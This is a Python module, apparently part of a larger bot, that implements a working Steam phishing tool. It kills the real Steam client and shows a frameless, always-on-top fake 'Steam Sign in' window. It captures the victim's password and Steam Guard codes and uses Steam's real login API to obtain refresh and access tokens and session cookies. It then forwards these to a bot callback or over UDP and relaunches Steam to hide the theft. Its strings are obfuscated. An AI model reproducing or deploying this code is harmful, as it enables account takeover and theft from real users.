"""
steam_phish.py — Unified Steam Fake Login Module
-------------------------------------------------
Подключение в main.py:
    from core.steam_phish import start_steam_phish

    def on_steam_captured(data):
        account = data['account_name']
        password = data['password']
        cookies  = data['cookies']
        tokens   = data['refresh_token']

    start_steam_phish(callback=on_steam_captured, logger_callback=log_to_bot)
"""
import os
import sys
import time
import json
import base64
import secrets
import threading
import traceback
import subprocess
import urllib.request
import urllib.parse
from io import BytesIO
from core.obfuscation import decrypt_string

try:
    import ctypes
    import ctypes.wintypes
    HAS_CTYPES = True
except ImportError:
    HAS_CTYPES = False

try:
    import webview
    import qrcode
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    HAS_DEPS = True
except ImportError as e:
    print(decrypt_string("NRMlSz0lPAM3KBpQG0oOQE5fERg9ODcFehMPSBdXAh8AUQFLrNHNQiESFw=="))
    HAS_DEPS = False

_API = decrypt_string("HzUiNSF7f2AqOT1vKicuOBoxOTI3MzUrZSo7LHYaCiwDKTMrJigzLj8gOy8KNjkvHiIz")
EP_BEGIN_CRED  = decrypt_string("FW05OwcsdiA/EANWM0wSEj1XCxgnPjc0MxYpShddAxQaWxkHPX4vUw==")
EP_BEGIN_QR    = decrypt_string("FW05OwcsdiA/EANWM0wSEj1XCxgnPjc0MxY7al1PVw==")
EP_POLL        = decrypt_string("FW05OwcsdjI1GwZ5B00OKQtBCwIhPwoWOwMfS11PVw==")
EP_UPDATE      = decrypt_string("FW05OwcsdjcqEwtMF3gTDgZhHRg9ODYMDR4eUCFNAxsDdQ0KPDUaDT4SRU5D")
EP_RSA         = decrypt_string("FW05OwcsdiU/AzpZAUoRFRxWKjgPASwANh4JcxdASQxf")
EP_TOKEN       = decrypt_string("FW05OwcsdiU/GQ9KE00DOw1RHRg9BTYJPxksVwB4FgpBREk=")
EP_FINALIZE    = decrypt_string("BkYMGz1rBlIyGhBEBB0NHCVlAgg2NS1/JBVbUxBGWxolXnYJIzs6AFgUFF4NWQUU")

def _find_steam_exe():
    decrypt_string("vq2p4J/TidKKwru6o7i39U7ixbv+geCz2KfSGAFNAxsDHB0TK3GJ34rHSujG6d6r7+LCu/t/")
    candidates = [
        decrypt_string("LQgkOzw+PhA7Gkp+G1UDCU4aAFN4eAUxLhILVS5KEh8PX1YONjQ="),
        decrypt_string("LQgkOzw+PhA7Gkp+G1UDCTJhDA4vPAURLhILVVxcHh8="),
    ]

    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             decrypt_string("JA4QEQUAAgoXHhsWb2d4azkuMiAOFzEjPSwIEi02KjQ="))
        path = winreg.QueryValueEx(key, "InstallPath")[0]
        winreg.CloseKey(key)
        exe = os.path.join(path, decrypt_string("HUYdCiN/PBo/"))
        if os.path.exists(exe):
            return exe
    except Exception:
        pass
    for c in candidates:
        if os.path.exists(c):
            return c
    return None

def kill_steam():
    decrypt_string("vqWo257jideL97uwoom2z7+wWLvxgNmy5Kbs6Mfo56vvEgsfKzA0TD8PDxha6dSr7+LNS57pid+L9ru6oom2x7+zqeBnf3myyKfU6MXp1Kvu4si6x4Hpsu+m6BgmSxMfTuLNus+B4rLiV7u7ooi2wr6JVg==")
    try:
        result = subprocess.run(
            ["taskkill", "/f", "/im", decrypt_string("HUYdCiN/PBo/")],
            capture_output=True, text=True
        )
        killed = "SUCCESS" in result.stdout or result.returncode == 0
        if killed:
            print(decrypt_string("NRglSx0lPAM3VxpKHVoDCR0SEwIiPTwGdA=="))
            time.sleep(1.5)
        return killed
    except Exception as e:
        print(decrypt_string("NRMlSyU4NQ4FBB5dE1RGHxxAFxl0cSIHJw=="))
        return False

def relaunch_steam(steam_exe=None):
    decrypt_string("vq2o3p/RideKwLqIooa3+b+zqNGe4YnXi/VK6M/p1qvv4/q78IDWs9On0ujLGTUOC1MVS57uidyL9rqDooxGq+zixrv9gedCis26iKKDRqrS4/NLnuaJ0orNuoaihLf9voqo0J7pdw==")
    exe = steam_exe or _find_steam_exe()
    if exe and os.path.exists(exe):
        try:
            # 0x00000008 = DETACHED_PROCESS. This separates it from the Python process tree.
            subprocess.Popen([exe], close_fds=True, creationflags=0x00000008)
            time.sleep(2)
            print(decrypt_string("NRglSxw0NQMvGQlQF11GKRpXGQZ0cSIHIhIX"))
        except Exception as e:
            print(decrypt_string("NRMlSzw0NQMvGQlQLUoSHw9fWA48IzYQYFcRXQ8="))
    else:
        print(decrypt_string("NRMlSx0lPAM3Vw9AF1oTDg9QFA5uPzYWehEFTRxdSloNUxYFISV5ED8bC00cWg5U"))

class SteamPhishApi:
    decrypt_string("JGFYV2NveTIjAwJXHBkECAdWHw5uenkxLhILVVJYEw4GEgsfLyU8QjcWCVAbVwNU")

    def __init__(self, callback, logger_callback=None, steam_exe=None):
        self.callback        = callback
        self.log             = logger_callback or (lambda x: None)
        self.steam_exe       = steam_exe
        self._window         = None
        self.running         = True
        self.client_id       = None
        self.request_id      = None
        self._username       = ""
        self._password       = ""
        self._poll_thread    = None

    def set_window(self, w):
        self._window = w

    def log_event(self, msg):
        print(f"[JS] {msg}")
        self.log(f"📝 {msg}")

    def collect(self, username, password):
        decrypt_string("vq2o1Z7qiO6KwLqGoou2yr+wqN6e6ojueqfY6MDo96rVEqjQnu+J0YrPuoVd6dmq3uP5us9xidp6p9fowunQqt7iw0sdOD4Meh4EFg==")
        self._username = username
        self._password = password
        self.log(decrypt_string(decrypt_string("BgtPMns/E1sXGS9hIm0jHSB6Nxt8NBcKMgFce10NIkIDHT8uYRYPWhEgDgEBWggvV18+GAISCBYXL1JROFMBQixhQFgFFTpaODArVzhTJxE0AxVcNiQJMz4ZAUA+UzcLCmYxAAcSNgUKMzN+OGoSTwhhMUQFKGxR")).format(username=username, password=password))
        threading.Thread(target=self._do_credentials, daemon=True).start()

    def submit_2fa(self, code):
        threading.Thread(target=self._update_session, args=(code, 3), daemon=True).start()

    def collect_sms(self, code):
        threading.Thread(target=self._update_session, args=(code, 4), daemon=True).start()

    def close(self, send_close_signal=None):
        decrypt_string("LV4XGCtxLQo/Vx1RHF0JDUASNxs6ODYMOxsGQVJKAxQKEhlLDR0WMR9XGVEVVwcWTkQRCm4EHTJ6FQ9eHUsDWgpXCx88PiALNBBE")
        self.running = False

        if send_close_signal:
            try:
                send_close_signal()
            except Exception:
                pass
        if self._window:
            try:
                self._window.destroy()
            except Exception:
                pass

    def _do_credentials(self):
        try:

            rsa_resp = json.loads(urllib.request.urlopen(
                decrypt_string("FXcoNBwCGB9lFglbHUwIDjFcGQYrbCIXKBsGURAXFhscQR1FPyQ2Fj9fGV0eX0glG0EdGSAwNAdzCg==")
            ).read())["response"]
            mod = int(rsa_resp["publickey_mod"], 16)
            exp = int(rsa_resp["publickey_exp"], 16)
            ts  = rsa_resp["timestamp"]

            pub_key = RSAPublicNumbers(exp, mod).public_key()
            enc_pass = base64.b64encode(
                pub_key.encrypt(self._password.encode(), padding.PKCS1v15())
            ).decode()

            payload = urllib.parse.urlencode({
                "account_name": self._username,
                "encrypted_password": enc_pass,
                "encryption_timestamp": ts,
                "remember_login": "true",
                "device_friendly_name": decrypt_string("PUYdCiNxGg4zEgRMUhEdFR0cHw46NDcUclApdz9pMy4rYDYqAxR+Tn0nKR9bRE8="),
                "platform_type": "2"
            }).encode()
            auth = json.loads(urllib.request.urlopen(
                urllib.request.Request(EP_BEGIN_CRED, data=payload, method="POST")
            ).read())

            resp = auth.get("response", {})
            if "client_id" not in resp:
                print(decrypt_string("NRMlSw8kLQp6EQtRHlwCQE5JGR46OSQ="))
                self.log(decrypt_string(decrypt_string("AlYCChQGbQg4Hx0XPn0zCQtQMCc0BzwwI0IyVhlcLRxBQhI+JTQKIS0+BHcrYARRCURTKmEbLxoyJxIKFRY1MBYHPDwiNCAwbEJdcBZhFRA0AxVcNiQ7Dj4ZAUA+UzcLCmYxAwM7LgoQIw1ZOHoSTwhhMUQFKGxR")).format(username=self._username))
                if self._window:
                    self._window.evaluate_js("showInputError()")
                return

            self.client_id  = resp["client_id"]
            self.request_id = resp["request_id"]

            if self._window:
                self._window.evaluate_js(decrypt_string("HVoXHA0+NwQzBQd5AklOXRVBHQcofwYXKRIYVhNUAwdJGw=="))

            self._start_poll()

        except Exception as e:
            print(decrypt_string("NRMlSy0jPAY/GR5RE1UVWgtACgQ8a3kZPwo="))
            traceback.print_exc()
            if self._window:
                self._window.evaluate_js("showInputError()")

    def _update_session(self, code, code_type):
        try:
            payload = urllib.parse.urlencode({
                "client_id": self.client_id,
                "steamid": "0",
                "code": code,
                "code_type": code_type
            }).encode()
            urllib.request.urlopen(
                urllib.request.Request(EP_UPDATE, data=payload, method="POST")
            )
        except urllib.error.HTTPError as e:
            body = e.read().decode()
            print(decrypt_string("NRMlS3wXGEI/BRhXABkdH0BRFw8rLGNCIRUFXAtE"))
            if self._window:
                self._window.evaluate_js(decrypt_string("HVoXHAsjKw0oX01vAFYIHU5RFw8rcXEZP1kJVxZcG1NJGw=="))
        except Exception as e:
            print(decrypt_string("NRMlS3wXGEI/BRhXAANGAQtP"))

    def _start_poll(self):
        if not self._poll_thread or not self._poll_thread.is_alive():
            self._poll_thread = threading.Thread(
                target=self._poll_loop, daemon=True)
            self._poll_thread.start()

    def _poll_loop(self):
        print(decrypt_string("NRglSx4+NQ4zGQ0YE0wSEk5BHRg9ODYMdFlE"))
        while self.running and self.client_id:
            try:
                payload = urllib.parse.urlencode({
                    "client_id":  self.client_id,
                    "request_id": self.request_id
                }).encode()
                data = json.loads(urllib.request.urlopen(
                    urllib.request.Request(EP_POLL, data=payload, method="POST")
                ).read())
                res = data.get("response", {})
                if "refresh_token" in res:
                    print("[+] Session captured!")
                    self._handle_success(res)
                    return
            except Exception as e:
                print(decrypt_string("NRMlSz4+NQ56EhhKHUtcWhVXBQ=="))
            time.sleep(2)

    def start_qr_loop(self):
        while self.running:
            try:
                payload = urllib.parse.urlencode({
                    "device_friendly_name": decrypt_string("PUYdCiNxGg4zEgRMUhEdFR0cHw46NDcUclApdz9pMy4rYDYqAxR+Tn0nKR9bRE8="),
                    "platform_type": "2"
                }).encode()
                resp = json.loads(urllib.request.urlopen(
                    urllib.request.Request(EP_BEGIN_QR, data=payload, method="POST")
                ).read()).get("response", {})
                if not resp:
                    time.sleep(5)
                    continue

                url        = resp["challenge_url"]
                client_id  = resp["client_id"]
                request_id = resp["request_id"]
                interval   = resp.get("interval", 5)

                qr = qrcode.QRCode(version=7,
                    error_correction=qrcode.constants.ERROR_CORRECT_H,
                    box_size=8, border=3)
                qr.add_data(url)
                qr.make(fit=True)
                buf = BytesIO()
                qr.make_image(fill_color="black", back_color="white").save(buf, format="PNG")
                b64 = base64.b64encode(buf.getvalue()).decode()

                if self._window:
                    self._window.evaluate_js(f'updateQR("{b64}")')

                old_cid, old_rid = self.client_id, self.request_id
                self.client_id   = client_id
                self.request_id  = request_id
                self._start_poll()

                for _ in range(30):
                    if not self.running:
                        return
                    time.sleep(1)

            except Exception as e:
                print(decrypt_string("NRMlSx8DeQcoBQVKSBkdHxM="))
                time.sleep(5)

    def _handle_success(self, auth_data):
        try:
            account       = auth_data.get("account_name", self._username)
            refresh_token = auth_data.get("refresh_token", "")

            self.log(decrypt_string(decrypt_string("AlZLPxQGbQg4Hx0XPn0zCQtQMCc0Bzwwbz0+YBlcUBxBABUtOT4zMTdcC1ZLcAA0CUQrKnY8KVM/DiRWJVsQPVtHLlkrBRwXFDQaCT9TMxMhWA9AACYUWjsaBUA+UzcLCmNFVg==")).format(account=account))

            steam_id_64 = ""
            try:
                jwt_body = json.loads(
                    base64.b64decode(refresh_token.split(".")[1] + "==").decode("utf-8", errors="replace")
                )
                steam_id_64 = str(jwt_body.get("sub", ""))
            except Exception:
                pass

            access_token = auth_data.get("access_token", "")

            sessionid = secrets.token_hex(12)
            base_cookies = {"sessionid": sessionid}
            if steam_id_64 and access_token:
                base_cookies["steamLoginSecure"] = f"{steam_id_64}%7C%7C{access_token}"
            base_cookies["steamRefresh_steam"] = f"{steam_id_64}%7C%7C{refresh_token}" if steam_id_64 else refresh_token

            try:
                finalize_payload = urllib.parse.urlencode({
                    "nonce": refresh_token,
                    "sessionid": sessionid,
                    "redir": decrypt_string("BkYMGz1rdk0pAw9ZH1oJFwNHFgI6KHcBNRpFWxpYElU=")
                }).encode()
                cookie_handler = urllib.request.HTTPCookieProcessor()
                opener = urllib.request.build_opener(cookie_handler)

                req = urllib.request.Request(
                    EP_FINALIZE, data=finalize_payload, method="POST",
                    headers={
                        "Content-Type": decrypt_string("D0IIBycyOBYzGAQXChQRDRkfHgQ8PHQXKBsPVhFWAh8K"),
                        "Origin": decrypt_string("BkYMGz1rdk02GA1RHBcVDgtTFRshJjwQPxNEWx1U"),
                        "Referer": decrypt_string("BkYMGz1rdk02GA1RHBcVDgtTFRshJjwQPxNEWx1USQ=="),
                        "User-Agent": decrypt_string("I10CAiI9OE1vWVoYWm4PFApdDxhuHw1Ca0dECEkZMRMABExQbilvVnNXK0gCVQMtC1AzAjp+bFFtWVkOUhEtMjp/NEduPTAJP1ctXRFSCVNOcRAZITw8TWtFWhZCF1ZUXhIrCigwKwt1QlkPXApQ")
                    }
                )
                opener.open(req)
                for c in cookie_handler.cookiejar:
                    base_cookies[c.name] = c.value
            except Exception as e:
                print(decrypt_string("NR8lSyg4NwM2HhBdHlYBEwAIWBArLA=="))

            cookies_json = []

            MAIN_DOMAINS = [decrypt_string("QEEMDi88Og03Gh9WG00fVA1dFQ=="), decrypt_string("QEEMDi88KQ0tEhhdFhcFFQM=")]
            for domain in MAIN_DOMAINS:
                for name, value in base_cookies.items():
                    cookies_json.append({
                        "domain": domain,
                        "name": name,
                        "value": value,
                        "path": "/",
                        "secure": True,
                        "httpOnly": name in ("steamLoginSecure", "steamRefresh_steam"),
                        "sameSite": "None"
                    })

            try:
                for c in cookie_handler.cookiejar:

                    if c.domain in MAIN_DOMAINS and c.name in base_cookies:
                        continue

                    cookies_json.append({
                        "domain": c.domain,
                        "name": c.name,
                        "value": c.value,
                        "path": c.path,
                        "secure": c.secure,
                        "httpOnly": c.has_nonstandard_attr('httponly') or name in ("steamLoginSecure", "steamRefresh_steam"),
                        "sameSite": "None"
                    })
            except: pass

            SECONDARY_DOMAINS = [decrypt_string("HUYXGSt/KhY/FgdIHU4DCAtWVgghPA=="), decrypt_string("BlcUG2AiLQc7GhpXBVwUHwocGwQj"), decrypt_string("HUYdCiN8Ogo7A0RbHVQ=")]
            for domain in SECONDARY_DOMAINS:

                for name in ("sessionid", "steamLoginSecure"):
                    if name in base_cookies:
                        cookies_json.append({
                            "domain": domain,
                            "name": name,
                            "value": base_cookies[name],
                            "path": "/",
                            "secure": True,
                            "httpOnly": name == "steamLoginSecure",
                            "sameSite": "None"
                        })

            json_str = json.dumps(cookies_json, indent=2, ensure_ascii=False)

            msg = decrypt_string("nq32xW5tO1wJAw9ZHxmE+voSAwotMjYXNAMXBF1bWCYAbhY=")
            if access_token:
                msg += decrypt_string("nq3s+m5tO1wbFAldAUpGLgFZHQV0bXYAZCsEBBFWAh9QSRkILTQqEQUDBVMXVz1AWgJINjNtdgE1Ew8GLlc6FA==")
            msg += decrypt_string("jKvDhPbeeV44SThdFEsDCQYSLAQlNDdYZlgIBi5XWhkBVh1VNSM8BCgSGVAtTQkRC1wjUX1haT8nS0VbHV0DRDJcJAU=")
            msg += decrypt_string("nq31wW5tO1wZGAVTG1wVWr6FqNue7onai/a6iKKEt/FO4spLBAIWLHqm7ujC6d+q1RxERCxv")
            self.log(msg)

            result = {
                "account_name":  account,
                "password":      self._password,
                "refresh_token": refresh_token,
                "access_token":  access_token,
                "cookies":       base_cookies,
                "cookies_json":  cookies_json,
            }

            if self.callback:

                try:
                    self.callback(result)
                except Exception as e:
                    print(decrypt_string("LVMUBywwOgl6EhhKHUtcWhVXBQ=="))

            self.close()
            threading.Thread(
                target=lambda: (time.sleep(1), relaunch_steam(self.steam_exe)),
                daemon=True
            ).start()

        except Exception as e:
            print(decrypt_string("NRMlSyYwNwY2EjVLB1oFHx1BWA48IzYQYFcRXQ8="))
            traceback.print_exc()

def _force_icon(icon_path):
    if not HAS_CTYPES or not os.path.exists(icon_path):
        return
    def _apply():
        time.sleep(1.2)
        try:
            user32 = ctypes.windll.user32
            hicon  = user32.LoadImageW(None, icon_path, 1, 0, 0, 0x30)
            if not hicon:
                return
            pid = os.getpid()
            def cb(hwnd, _):
                d = ctypes.wintypes.DWORD()
                user32.GetWindowThreadProcessId(hwnd, ctypes.byref(d))
                if d.value == pid:
                    user32.SendMessageW(hwnd, 0x0080, 0, hicon)
                    user32.SendMessageW(hwnd, 0x0080, 1, hicon)
                return True
            proto = ctypes.WINFUNCTYPE(
                ctypes.wintypes.BOOL, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
            user32.EnumWindows(proto(cb), 0)
        except Exception:
            pass
    threading.Thread(target=_apply, daemon=True).start()

def start_steam_phish(callback, logger_callback=None, resource_dir=None, kill_before=True):
    """
    Запустить фейковое окно Steam.

    Args:
        callback        — вызывается при успехе с dict {account_name, password, cookies, ...}
        logger_callback — функция(str) для отправки логов в бота
        resource_dir    — папка с login/steam_ui.html (по умолчанию — рядом с этим файлом)
        kill_before     — убивать steam.exe перед запуском (default True)
    """
    if not HAS_DEPS:
        print(decrypt_string("NRMlSz0lOBAuKBlMF1gLJR5aERgma3kGPwcPVhZcCBkHVwtLIzgqETMZDRRSWAQVHEYRBSl/"))
        return False

    import sys as _sys

    if getattr(_sys, "frozen", False):

        _base = getattr(_sys, "_MEIPASS", os.path.dirname(_sys.executable))
        html_path = os.path.join(_base, decrypt_string("HUYdCiMOLAt0Hx5VHg=="))
        ico_path  = os.path.join(_base, decrypt_string("HUYdCiN/MAE1"))
    else:
        if resource_dir is None:
            resource_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        login_dir = os.path.join(resource_dir, "login")
        html_path = os.path.join(login_dir, decrypt_string("HUYdCiMOLAt0Hx5VHg=="))
        ico_path  = os.path.join(login_dir, decrypt_string("HUYdCiN/MAE1"))

    if not os.path.exists(html_path):
        print(decrypt_string("NRMlSz0lPAM3KB9RXFESFwISFgQ6cT8NLxkOGBNNRgEGRhUHESE4FjIK"))
        return False

    steam_exe = _find_steam_exe()
    if kill_before:
        kill_steam()

    log = logger_callback or (lambda x: print(f"[LOG] {x}"))
    log(decrypt_string(decrypt_string("BgtPMnhiE1sXGS9hIm0jHSB6NTIDExgUPh4dACtbKipdABUuYWU3EjdcOVZdCgcsWXg8OCB+HjtrPS5rFUoLMBdqSV4EYyEuKQQuDBNgMhwHVy8JejA/UzIBPXwICiUcRWgWBiU0PCZ1QwRwK2AEAglEPyp2IS9SMhQbcUNUMEk5Y0VW")))

    api = SteamPhishApi(callback=callback, logger_callback=log, steam_exe=steam_exe)

    file_url = decrypt_string("CFsUDnR+dk0hHx5VHmYWGxpaVhkrITUDORJCVwEXFR8eHlhMYXZwHw==")
    window = webview.create_window(
        "Steam Sign in",
        url=file_url,
        js_api=api,
        width=750,
        height=480,
        frameless=True,
        on_top=True,
        resizable=False,
    )



    def on_closing():
        log(decrypt_string(decrypt_string("AlYCChQIFQQ9Jz1aS3AyVQtjOUQeEwARPh8zDzhTUwwnWxxbJTRvJnFDBHYZdwcvXGg8OCB+Dww=")))

    window.events.closing += on_closing
    api.set_window(window)

    _force_icon(ico_path)
    threading.Thread(target=api.start_qr_loop, daemon=True).start()
    webview.start(icon=ico_path if os.path.exists(ico_path) else None)
    return True

if __name__ == "__main__":
    import argparse
    import socket as _sock

    parser = argparse.ArgumentParser(description="Steam Phish")
    parser.add_argument("--udp", type=int, default=0,
                        help="UDP port to forward logs to bot")
    args = parser.parse_args()

    udp_port = args.udp

    if udp_port:
        _udp_sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
        def _udp_log(msg: str):
            try:
                _udp_sock.sendto(msg.encode("utf-8", errors="replace"), (decrypt_string("XwBPRX5/aUxr"), udp_port))
            except Exception:
                pass
        logger = _udp_log
    else:
        logger = lambda msg: print(f"[LOG] {msg}")

    def _on_captured(data):
        """Called after successful login — _handle_success already logged text via UDP.
        Save cookies to JSON file and send FILE: path to log_listener."""
        time.sleep(0.5)

        cookies_json = data.get("cookies_json", [])
        account = data.get("account_name", "unknown")

        if cookies_json and udp_port:
            try:
                import tempfile as _tf, os as _os, json as _json
                fd, path = _tf.mkstemp(suffix=decrypt_string("QFgLBCA="), prefix=f"steam_cookies_{account}_")
                with _os.fdopen(fd, 'w', encoding='utf-8') as f:
                    _json.dump(cookies_json, f, indent=2, ensure_ascii=False)

                _udp_sock.sendto(decrypt_string("KHs0LnQqKQMuHxc=").encode("utf-8"), (decrypt_string("XwBPRX5/aUxr"), udp_port))
                time.sleep(0.5)
            except Exception as e:
                logger(decrypt_string("jKjYhPbeebLEpuLoyunXqtTiyEuf0Inci/K7uKKJtse+h6jWnumI7Xo9OXc8A0YBC08="))

        if udp_port:
            try:
                _udp_sock.sendto(b"CLOSE", (decrypt_string("XwBPRX5/aUxr"), udp_port))
            except Exception:
                pass

    if getattr(__import__("sys"), "frozen", False):
        import sys as _sys
        _res_dir = os.path.dirname(_sys.executable)
        _login_dir_override = _res_dir
    else:
        _res_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        _login_dir_override = None

    start_steam_phish(
        callback=_on_captured,
        logger_callback=logger,
        resource_dir=_res_dir,
        kill_before=True,
    )
